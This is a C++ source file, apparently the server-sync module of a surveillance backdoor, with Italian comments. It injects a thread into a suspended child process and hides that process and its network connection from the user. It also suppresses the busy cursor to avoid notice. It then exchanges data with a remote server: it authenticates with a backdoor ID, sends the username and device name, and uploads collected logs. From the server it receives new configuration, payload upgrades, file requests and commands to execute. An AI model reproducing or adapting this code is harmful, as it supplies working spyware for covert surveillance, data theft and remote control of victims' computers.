#include "../common.h"
#include "../H4-DLL.h" 
#include "../AM_Core.h"
#include "ASP.h"
#include <winhttp.h>
#include <stdio.h>
#include <shlwapi.h>
#include <crypto/sha1.h>
#include <string.h>
#include "../x64.h"
#include "../bss.h"

/////////////////////////////////////
//    Funzioni Chiamate dal core   //
/////////////////////////////////////
DWORD ASP_Poll()
{
	// Controlla che la shared mem dei comandi sia attiva
	if (!ASP_IPC_command)
		return ASP_POLL_ERROR;

	// Se sta ancora eseguendo l'operazione
	if (ASP_IPC_command->ctrl.status == ASP_FETCH)
		return ASP_POLL_FETCHING;

	// ASP ha tornato un errore
	if (ASP_IPC_command->ctrl.status == ASP_ERROR) {
		ASP_IPC_command->ctrl.status = ASP_NOP;
		return ASP_POLL_ERROR;
	}

	// Se lo status e' ASP_NOP o ASP_DONE.
	// Puo' settare ASP_IPC_command->status, tanto se non e' in
	// ASP_FETCH l'host ASP non modifica piu' lo status
	ASP_IPC_command->ctrl.status = ASP_NOP;
	return ASP_POLL_DONE;

}

// Aspetta che l'host ASP abbia terminato la richiesta
static BOOL ASP_Wait_Response()
{
	LOOP{
		DWORD ret_val;

		Sleep(ASP_SLEEP_TIME);
		ret_val = ASP_Poll();
		if (ret_val == ASP_POLL_FETCHING)
			continue;

		if (ret_val == ASP_POLL_ERROR)
			return FALSE;

		// Se ha tornato ASP_POLL_DONE allora esce
		// dal ciclo e ritorna TRUE
		break;
	}

	return TRUE;
}

void ModifyAppstart(BOOL to_disable)
{
	HCURSOR hsc;

	if (to_disable) {
		if (!(hsc = LoadCursor(NULL, IDC_ARROW)))
			return;
		if (!(hsc = CopyCursor(hsc)))
			return;
		if (!SetSystemCursor(hsc, 32650))
			DestroyCursor(hsc);
		return;
	}
	SystemParametersInfo(SPI_SETCURSORS, 0, 0, 0);
}

// Inizializza le strutture necessarie ad ASP
// Torna 0 se ha successo
DWORD ASP_Setup(char* asp_server, ASP_THREAD *asp_thread)
{
	HMODULE hMod;

	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));

	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
	VALIDPTR(asp_thread->pCommon._LoadLibrary = (LoadLibrary_T)HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
	VALIDPTR(asp_thread->pCommon._GetProcAddress = (GetProcAddress_T)HM_SafeGetProcAddress(hMod, "GetProcAddress"));
	VALIDPTR(asp_thread->pExitProcess = (ExitProcess_T)HM_SafeGetProcAddress(hMod, "ExitProcess"));

	HM_CompletePath(shared.H4DLLNAME, asp_thread->cDLLHookName);
	_snprintf_s(asp_thread->cASPServer, sizeof(asp_thread->cASPServer), _TRUNCATE, "%s", asp_server);
	_snprintf_s(asp_thread->cASPMainLoop, sizeof(asp_thread->cASPMainLoop), _TRUNCATE, "PPPFTBBP07");

	return 0;
}

// Inizializza nel core la shared memory per ASP
BOOL ASP_IPCSetup()
{
	hASP_CmdFile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPC_CTRL), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
	if (hASP_CmdFile)
		ASP_IPC_command = (ASP_IPC_CTRL*)FNC(MapViewOfFile)(hASP_CmdFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));

	if (ASP_IPC_command) {
		memset(ASP_IPC_command, 0, sizeof(ASP_IPC_CTRL));
		return TRUE;
	}

	return FALSE;
}

// Chiude nel core la shared memory per ASP
static void ASP_IPCClose()
{
	if (ASP_IPC_command) {
		FNC(UnmapViewOfFile)(ASP_IPC_command);
		ASP_IPC_command = NULL;
		CloseHandle(hASP_CmdFile);
	}
	hASP_CmdFile = NULL;
	ASP_IPC_command = NULL;
}


// Lancia process_name come host ASP verso il server asp_server
// Torna TRUE se ha successo.
BOOL ASP_Start(char* process_name, char* asp_server)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD init_timeout;

	ASP_THREAD asp_thread = {};

	// Inizializza le strutture per il thread iniettato
	if (ASP_Setup(asp_server, &asp_thread) != 0)
		return FALSE;

	// Inizializza la shared memory
	if (!ASP_IPCSetup()) {
		ASP_IPCClose();
		return FALSE;
	}

	ModifyAppstart(TRUE);

	// L'host ASP setta il comando di inizializzazione
	// Deve essere sempre il primo comando dato all'host ASP
	// che si conclude con il ritorno dell'ip da nascondere
	// (necessario per poter fare ASP_Poll() in seguito
	ASP_IPC_command->ctrl.action = ASP_SETUP;
	ASP_IPC_command->ctrl.status = ASP_FETCH;

	// Lancia il process ASP host con il main thread stoppato
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	HM_CreateProcess(process_name, CREATE_SUSPENDED, &si, &pi, 0);
	// Se HM_CreateProcess fallisce, pi.dwProcessId e' settato a 0
	if (!pi.dwProcessId) {
		ASP_Stop();
		return FALSE;
	}

	// HM_CreateProcess ritorna solo il PID del figlio, non apre
	// handle al processo o al thread (quelli vengono chiusi del thread
	// iniettato in explorer)
	ASP_HostProcess = FNC(OpenProcess)(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
	if (ASP_HostProcess == NULL) {
		ASP_Stop();
		return FALSE;
	}

	// Se e' a 64 bit ci risparmiamo i passi successivi e chiudiamo subito...
	if (IsX64Process(pi.dwProcessId)) {
		ASP_Stop();
		return FALSE;
	}

	// Aggiunge pi.dwProcessId alla lista dei PID da nascondere 
	// (e lo memorizza in pid_hide per poi poter togliere l'hide)
	SET_PID_HIDE_STRUCT(pid_hide, pi.dwProcessId);
	AM_AddHide(HIDE_PID, &pid_hide);

	// XXX Sleep Aspettiamo che il thread di injection in iexplorer
	// abbia finito 
	Sleep(3000);

	// Lancia il thread di ASP che eseguira' il main loop 
	if (!ASP_StartASPThread(pi.dwProcessId, &asp_thread)) {
		ASP_Stop();
		return FALSE;
	}

	// Attende che l'host ASP abbia tornato l'indirizzo IP da nascondere
	for (init_timeout = 0; init_timeout < ASP_START_TIMEOUT; init_timeout += ASP_SLEEP_TIME) {
		DWORD ret_val;

		Sleep(ASP_SLEEP_TIME);
		ret_val = ASP_Poll();
		if (ret_val == ASP_POLL_FETCHING)
			continue;

		// Se ha concluso con successo legge l'ip (da out_param), 
		// lo memorizza nella struttura connection_hide e lo nasconde
		if (ret_val == ASP_POLL_DONE) {
			ASP_REPLY_SETUP* rs = (ASP_REPLY_SETUP*)ASP_IPC_command->out_param;
			SET_CONNETCION_HIDE_STRUCT(connection_hide, rs->server_addr, htons(rs->server_port));
			AM_AddHide(HIDE_CNN, &connection_hide);
			return TRUE;
		}

		// Ha tornato ASP_POLL_ERROR
		break;
	}

	// Se e' scaduto il timeout di attesa per lo startup
	// o l'host ASP ha tornato un errore, allora lo termina
	// ed esce
	ASP_Stop();
	return FALSE;
}

// Termina l'uso di ASP (e del processo relativo)
void ASP_Stop()
{
	// Termina il processo host ASP e chiude la shared
	// memory relativa ai comandi
	SAFE_TERMINATEPROCESS(ASP_HostProcess);
	ASP_IPCClose();

	ModifyAppstart(FALSE);

	// Piccola attesa prima di cancellare l'hiding delle connessioni
	Sleep(5000);

	// Se sono stati memorizzati (struttura settata),e quindi aggiunti,
	// una connessione o un PID da nascondere, li toglie dalla lista di 
	// hiding e azzera le struttura relative
	if (IS_SET_CONNETCION_HIDE_STRUCT(connection_hide)) {
		AM_RemoveHide(HIDE_CNN, &connection_hide);
		UNSET_CONNETCION_HIDE_STRUCT(connection_hide);
	}

	if (IS_SET_PID_HIDE_STRUCT(pid_hide)) {
		AM_RemoveHide(HIDE_PID, &pid_hide);
		//HideDevice dev_unhook; // Rimuoviamo l'hide dal processo che effettua la sync
		//dev_unhook.unhook_hidepid(pid_hide.PID, FALSE);
		UNSET_PID_HIDE_STRUCT(pid_hide);
	}
}

template<typename FnSetup,
	typename FnReturn,
	typename... Args>
bool execute_asp_command(WORD action, BOOL wait, FnSetup pre_check, FnReturn post_check, Args... args)
{
	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->ctrl.status != ASP_NOP)
		return false;

	ASP_IPC_command->ctrl.action = action;
	pre_check(args...);
	ASP_IPC_command->ctrl.status = ASP_FETCH;

	if (wait) {
		if (ASP_Wait_Response())
			return post_check(args...);
		
		return false;
	}

	return post_check(args...);
}

static void setup_nothing()
{
}

static bool post_nocheck()
{
	return true;
}
// Chiude gentilmente la connessione col server
void ASP_Bye()
{
	execute_asp_command(ASP_BYE, TRUE, setup_nothing, post_nocheck);
}

static void setup_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
{
	ASP_REQUEST_AUTH* ra;

	ra = (ASP_REQUEST_AUTH*)ASP_IPC_command->in_param;
	_snprintf_s(ra->backdoor_id, sizeof(ra->backdoor_id), _TRUNCATE, "%s", backdoor_id);
	_snprintf_s(ra->subtype, sizeof(ra->subtype), _TRUNCATE, "%s", subtype);
	memcpy(ra->instance_id, instance_id, sizeof(ra->instance_id));
	memcpy(ra->conf_key, conf_key, sizeof(ra->conf_key));
}

static bool post_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
{
	memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
	return TRUE;
}

// Il core la chiama per eseguire il passo AUTH del protocollo
// Se torna FALSE la sync dovrebbe essere interrotta
// response_command deve essere allocato dal chiamante
BOOL ASP_Auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
{
	return execute_asp_command(ASP_AUTH, TRUE, setup_auth, post_auth, backdoor_id, instance_id, subtype, conf_key, response_command);
}

static void setup_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
{
	ASP_REQUEST_ID* ri;

	ri = (ASP_REQUEST_ID*)ASP_IPC_command->in_param;
	_snwprintf_s(ri->username, sizeof(ri->username) / sizeof(WCHAR), _TRUNCATE, L"%s", username);
	_snwprintf_s(ri->device, sizeof(ri->device) / sizeof(WCHAR), _TRUNCATE, L"%s", device);
}

static bool post_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
{
	// Non puo' rispondere altro che proto OK, quindi ignoro out_command
	memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
	memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);
	return TRUE;
}

// Il core la chiama per eseguire il passo AUTH del protocollo
// Se torna FALSE la sync dovrebbe essere interrotta
// time_date e availables devono essere allocati dal chiamante
BOOL ASP_Id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
{
	return execute_asp_command(ASP_IDBCK, TRUE, setup_id, post_id, username, device, time_date, availables, size_avail);
}

static void setup_getupload(WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
{
	ZeroMemory(file_name, file_name_len);
	*upload_left = 0;

}

static bool post_getupload(WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
{
	ASP_REPLY_UPLOAD* ru;

	if (ASP_IPC_command->out_command == PROTO_NO)
		return true;
		

	ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
	*upload_left = ru->upload_left;
	_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);

	return true;
}

// Il core la chiama per ricevere un upload (is_upload e' TRUE) o un upgrade
// Ritorna il file_name (deve essere allocato dal chiamante), e il numero di upload rimanenti
// Se file_name e' tutto 0 vuol dire che c'e' stato un problema.
// file_name_len e' in byte
BOOL ASP_GetUpload(BOOL is_upload, WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
{
	
	WORD action = ASP_UPGR;
	if (is_upload)
		action = ASP_UPLO;

	return execute_asp_command(action, TRUE, setup_getupload, post_getupload, file_name, file_name_len, upload_left);
}

static void setup_sendlog(char* file_name, DWORD byte_per_second)
{
	ASP_REQUEST_LOG* rl;
	rl = (ASP_REQUEST_LOG*)ASP_IPC_command->in_param;
	_snwprintf_s(rl->file_name, sizeof(rl->file_name) / sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
	rl->byte_per_second = byte_per_second;
}

static bool post_sendlog(char* file_name, DWORD byte_per_second)
{
	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
	if (ASP_IPC_command->out_command == PROTO_OK)
		return true;

	return false;
}

// Manda un file di log
// Prende in input il path del log da mandare e il bandlimit
BOOL ASP_SendLog(char* file_name, DWORD byte_per_second)
{
	return execute_asp_command(ASP_SLOG, TRUE, setup_sendlog, post_sendlog, file_name, byte_per_second);
}

static void setup_sendstatus(DWORD log_count, UINT64 log_size)
{
	ASP_REQUEST_STAT* rs;
	rs = (ASP_REQUEST_STAT*)ASP_IPC_command->in_param;
	rs->log_count = log_count;
	rs->log_size = log_size;
}

static bool post_sendstatus(DWORD log_count, UINT64 log_size)
{
	if (ASP_IPC_command->out_command == PROTO_OK)
		return true;
	return false;

}
// Manda lo status dei log da spedire
// Prende in input numero e size dei log (qword)
BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
{
	return execute_asp_command(ASP_SSTAT, TRUE, setup_sendstatus, post_sendstatus, log_count, log_size);
}

static void setup_receiveconf(char* conf_file_path)
{
	ASP_REQUEST_CONF* rc;
	rc = (ASP_REQUEST_CONF*)ASP_IPC_command->in_param;
	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path) / sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);

}

static bool post_receiveconf(char* conf_file_path)
{
	if (ASP_IPC_command->out_command == PROTO_OK)
		return true;

	return false;
}
// Riceve la nuova configurazione
// Il file viene salvato nel path specificato (CONF_BU)
BOOL ASP_ReceiveConf(char* conf_file_path)
{
	return execute_asp_command(ASP_NCONF, TRUE, setup_receiveconf, post_receiveconf, conf_file_path);
}

void setup_handlepurge(long long* purge_time, DWORD* purge_size)
{
	return;
}

bool post_handlepurge(long long* purge_time, DWORD* purge_size)
{
	ASP_REPLY_PURGE* arp;

	*purge_time = 0;
	*purge_size = 0;

	// Controlla il response e la lunghezza minima di una risposta
	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
		return FALSE;

	// Numero di download richiesti
	arp = (ASP_REPLY_PURGE*)ASP_IPC_command->out_param;
	*purge_time = arp->purge_time;
	*purge_size = arp->purge_size;

	return TRUE;
}
// Ottiene i dati necessari per una richiesta di purge dei log
BOOL ASP_HandlePurge(long long* purge_time, DWORD* purge_size)
{
	return execute_asp_command(ASP_PURGE, TRUE, setup_handlepurge, post_handlepurge, purge_time, purge_size);
}

void setup_get_fs(DWORD* num_elem, fs_browse_elem** fs_array)
{
	return;
}

bool post_get_fs(DWORD* num_elem, fs_browse_elem** fs_array)
{
	BYTE* ptr;
	DWORD i, ret_len, elem_count;

	*num_elem = 0;

	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
		return FALSE;

	// Numero di download richiesti
	ptr = ASP_IPC_command->out_param;
	elem_count = *((DWORD*)ptr);
	ptr += sizeof(DWORD);
	if (elem_count == 0)
		return FALSE;

	// Alloca l'array di elementi fs
	*fs_array = (fs_browse_elem*)calloc(elem_count, sizeof(fs_browse_elem));
	if (!(*fs_array))
		return FALSE;

	// Valorizza gli elementi dell'array
	// e alloca tutte le stringhe di start_dir
	for (i = 0; i < elem_count; i++) {
		// profondita' (prima DWORD)
		(*fs_array)[i].depth = *((DWORD*)ptr);
		ptr += sizeof(DWORD);
		// start dir (stringa pascalizzata)
		if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
			break;

		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
		ptr += (ret_len + sizeof(DWORD));
	}

	return TRUE;
}
// Prende la lista delle richieste di filesystem
// Se torna TRUE ha allocato fs_array (che va liberato) di num_elem elementi
BOOL ASP_GetFileSystem(DWORD* num_elem, fs_browse_elem** fs_array)
{
	return execute_asp_command(ASP_FSYS, TRUE, setup_get_fs, post_get_fs, num_elem, fs_array);
}

void setup_get_cmd(DWORD* num_elem, WCHAR*** cmd_array)
{
	*num_elem = 0;
	return;
}

bool post_get_cmd(DWORD* num_elem, WCHAR*** cmd_array)
{
	BYTE* ptr;
	DWORD i, ret_len, elem_count;

	*num_elem = 0;

	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
		return FALSE;

	// Numero di download richiesti
	ptr = ASP_IPC_command->out_param;
	elem_count = *((DWORD*)ptr);
	ptr += sizeof(DWORD);
	if (elem_count == 0)
		return FALSE;

	// Alloca l'array di elementi fs
	*cmd_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
	if (!(*cmd_array))
		return FALSE;

	// Valorizza gli elementi dell'array
	for (i = 0; i < elem_count; i++) {
		// i comandi sono una serie di stringhe pascalizzate
		if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
			break;

		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
		ptr += (ret_len + sizeof(DWORD));
	}

	return TRUE;
}
// Prende la lista delle richieste di esecuzione comandi
// Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
BOOL ASP_GetCommands(DWORD* num_elem, WCHAR*** cmd_array)
{
	return execute_asp_command(ASP_CMDE, TRUE, setup_get_cmd, post_get_cmd, num_elem, cmd_array);
}

// Prende la lista dei download
// Se torna TRUE ha allocato string array (che va liberato) di num_elem elementi
BOOL ASP_GetDownload(DWORD* num_elem, WCHAR*** string_array)
{
	return execute_asp_command(ASP_DOWN, TRUE, setup_get_cmd, post_get_cmd, num_elem, string_array);
}
